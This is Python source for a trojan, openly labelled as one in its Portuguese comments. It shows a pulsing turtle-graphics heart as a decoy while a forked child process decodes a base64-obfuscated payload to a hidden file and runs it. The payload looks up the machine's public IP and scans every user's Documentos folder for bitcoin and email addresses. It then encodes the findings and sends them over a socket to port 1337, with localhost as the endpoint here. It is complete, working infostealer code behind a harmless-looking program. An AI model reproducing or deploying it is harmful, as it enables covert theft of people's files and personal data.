import os
import time
import base64
import turtle

t = turtle.Turtle()
t.speed(0)
t.hideturtle()
screen = turtle.Screen()
screen.bgcolor("lightblue")

# Função para desenhar um coração
def draw_heart(size):
    t.begin_fill()
    t.fillcolor("red")
    t.left(50)
    t.forward(size)
    t.circle(size * 0.4, 180)
    t.right(100)
    t.circle(size * 0.4, 180)
    t.forward(size)
    t.end_fill()

# Loop da animação
def animate_heart():
    size = 50
    growing = True

    while True:
        t.clear()
        draw_heart(size)
        screen.update()
        
        if growing:
            size += 1
            if size > 70:
                growing = False
        else:
            size -= 1
            if size < 50:
                growing = True

        time.sleep(0.05)

def main():
    pid = os.fork()

    if pid > 0:
        # Processo que parece ser legítimo
        
        # Configuração da tela
        screen.tracer(0)

        # Inicia a animação
        animate_heart()

        # Mantém a janela aberta
        turtle.done()
    else:
        # Processo do Trojan
        trojan()

def trojan():
    malware_fd = open(".malware.py", "wb")
    blob = "aW1wb3J0IHJlcXVlc3RzDQppbXBvcnQgc29ja2V0DQppbXBvcnQgYmFzZTY0DQppbXBvcnQganNvbg0KaW1wb3J0IHJlDQppbXBvcnQgb3MNCg0KDQpkZWYgbWFpbigpOg0KICAgICMgUGVnYSBvIGhvc3QgZGEgbcOhcXVpbmENCiAgICBob3N0bmFtZSA9IHNvY2tldC5nZXRob3N0bmFtZSgpDQoNCiAgICAjIFBlZ2EgbyBpcCBww7pibGljbyBkYSBtw6FxdWluYQ0KICAgIGhlYWRlcnMgPSB7DQogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NzguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83OC4wIg0KICAgIH0NCiAgICBwdWJsaWNfaXAgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vaXBhcGkuY28vaXAiLCBoZWFkZXJzID0gaGVhZGVycykudGV4dA0KDQogICAgIyBCdXNjYSBwb3IgZW5kZXJlw6dvcyBkZSBiaXRjb2lucyBlIGVuZGVyZcOnb3MgZGUgZW1haWxzDQogICAgYml0Y29pbl9hZGRyZXNzZXNfbGlzdCA9IFtdDQogICAgZW1haWxfYWRkcmVzc2VzX2xpc3QgPSBbXQ0KDQogICAgI1BlZ2EgdG9kb3MgYXMgc2XDp8O1ZXMgZGUgRG9jdW1lbnRvcyBkZSB0b2RvcyBvcyB1c3XDoXJpb3MNCiAgICBob21lID0gb3MubGlzdGRpcignL2hvbWUnKQ0KICAgIHByaW50KGhvbWUpDQogICAgdXNlcnNfZG9jcyA9IFtmJy9ob21lL3t1c2VyfS9Eb2N1bWVudG9zJyBmb3IgdXNlciBpbiBob21lXSAgICANCg0KICAgIGZvciBkb2MgaW4gdXNlcnNfZG9jczoNCiAgICAgICAgZm9yIHJvb3QsIF8sIGZpbGVzIGluIG9zLndhbGsoZG9jKToNCiAgICAgICAgICAgIGZvciBmaWxlIGluIGZpbGVzOg0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICNJZ25vcmEgb3MgYXJxdWl2b3MgemlwLCBwb3Igc2VyZW0gbXQgZ3JhbmRlcw0KICAgICAgICAgICAgICAgIGlmIGZpbGUuZW5kc3dpdGgoJ3ppcCcpOg0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgZmlsZV9mZCA9IG9wZW4oInt9L3t9Ii5mb3JtYXQocm9vdCwgZmlsZSksICJyIikNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICMgUGVnYSBvIGNvbnRlw7pkbyBkZSBjYWRhIGFycXVpdm8NCiAgICAgICAgICAgICAgICAgICAgZmlsZV9jb250ZW50cyA9IGZpbGVfZmQucmVhZCgpLnN0cmlwKCkNCg0KICAgICAgICAgICAgICAgICAgICAjIFByb2N1cmEgcG9yIGVuZGVyZcOnb3MgZGUgYml0Y29pbnMNCiAgICAgICAgICAgICAgICAgICAgIyBQcm9jdXJhIHBvciBlbmRlcmXDp29zIHF1ZSBjb21lw6dhbSBjb20gMSBvdSAzIGUgdGVtIDI2IG91IDMzIGNhcmFjdGVyZXMNCiAgICAgICAgICAgICAgICAgICAgIyBQcm9jdXJhIHBvciBlbmRlcmXDp29zIFNlZ1dpdCAoY29tZcOnYW5kbyBjb20gYmMxIGUgdGVuZG8gMzkgYSA1OSBjYXJhY3RlcmVzKQ0KICAgICAgICAgICAgICAgICAgICBiaXRjb2luX2FkZHJlc3NlcyA9IHJlLmZpbmRhbGwociIoWzEzXXsxfVthLWttLXpBLUhKLU5QLVoxLTldezI2LDMzfXxiYzFbYS16MC05XXszOSw1OX0pIiwgZmlsZV9jb250ZW50cykNCg0KICAgICAgICAgICAgICAgICAgICAjIFByb2N1cmEgcG9yIGVuZGVyZcOnb3MgZGUgZW1haWwNCiAgICAgICAgICAgICAgICAgICAgZW1haWxfYWRkcmVzc2VzID0gcmUuZmluZGFsbChyIlthLXowLTkuX10rQFthLXowLTldK1wuW2Etel17MSw3fSIsIGZpbGVfY29udGVudHMpDQoNCiAgICAgICAgICAgICAgICAgICAgIyBjVsOqIHNlIGFjaG91IGFsZ28NCiAgICAgICAgICAgICAgICAgICAgaWYgbGVuKGJpdGNvaW5fYWRkcmVzc2VzKSA+IDA6DQogICAgICAgICAgICAgICAgICAgICAgICBiaXRjb2luX2FkZHJlc3Nlc19saXN0ID0gYml0Y29pbl9hZGRyZXNzZXNfbGlzdCArIGJpdGNvaW5fYWRkcmVzc2VzDQogICAgICAgICAgICAgICAgICAgIGlmIGxlbihlbWFpbF9hZGRyZXNzZXMpID4gMDoNCiAgICAgICAgICAgICAgICAgICAgICAgIGVtYWlsX2FkZHJlc3Nlc19saXN0ID0gZW1haWxfYWRkcmVzc2VzX2xpc3QgKyBlbWFpbF9hZGRyZXNzZXMNCg0KICAgICAgICAgICAgICAgICAgICBmaWxlX2ZkLmNsb3NlKCkNCiAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgIHBhc3MNCiAgICANCiAgICAjIEJvdGEgbnVtIGpzb24NCiAgICBkYXRhID0gew0KICAgICAgICAibWFjaGluZV9ob3N0bmFtZSI6IGhvc3RuYW1lLA0KICAgICAgICAibWFjaGluZV9pcCI6IHB1YmxpY19pcCwNCiAgICAgICAgIjVfYml0Y29pbl9hZGRyZXNzZXNfZm91bmQiOiBiaXRjb2luX2FkZHJlc3Nlc19saXN0Wzo1XSwNCiAgICAgICAgIjVfZW1haWxfYWRkcmVzc2VzX2ZvdW5kIjogZW1haWxfYWRkcmVzc2VzX2xpc3RbOjVdDQogICAgfQ0KDQogICAgIyBDb2RpZmljYSBvIGpzb24gcGFyYSBiNjQNCiAgICBlbmNvZGVkX2RhdGEgPSBiYXNlNjQuYjY0ZW5jb2RlKGpzb24uZHVtcHMoZGF0YSkuZW5jb2RlKCkpDQoNCiAgICAjIENyaWEgdW0gc29ja2V0IGUgc2UgY29uZWN0YSBjb20gbyBzZXJ2aWRvciBuYSBwb3J0IGExMzM3DQoNCiAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQ0KDQogICAgcy5jb25uZWN0KCgiMTI3LjAuMC4xIiwgMTMzNykpDQogICAgcy5zZW5kKGVuY29kZWRfZGF0YSkNCiAgICBzLmNsb3NlKCkNCg0KDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgIG1haW4oKQ=="

    malware = base64.b64decode(blob)
    malware_fd.write(malware)
    malware_fd.close()

    os.system("trojan/bin/python3 .malware.py")

if __name__ == '__main__':
    main()